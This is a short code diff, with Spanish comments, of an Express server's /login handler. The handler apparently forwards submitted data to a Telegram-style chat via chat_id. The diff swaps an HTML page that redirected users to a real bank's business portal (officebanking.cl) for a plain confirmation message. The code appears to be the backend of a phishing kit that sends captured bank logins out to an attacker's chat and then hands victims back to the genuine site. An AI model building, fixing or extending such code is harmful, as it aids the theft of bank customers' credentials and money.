@@ -27,21 +27,7 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    // Aquí estaba el error: faltaban comillas y concatenación
-    res.send(`
-  <!DOCTYPE html>
-  <html lang="es">
-    <head>
-      <meta charset="UTF-8">
-      <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
-      <title>Redirigiendo...</title>
-    </head>
-    <body>
-      ✅ Hemos recibido tu solicitud. Serás redirigido en 3 segundos.
-    </body>
-  </html>
-`);
-
+  res.send("✅ Hemos recibido tu solicitud.");
 
   } catch (error) {
     console.error(error);
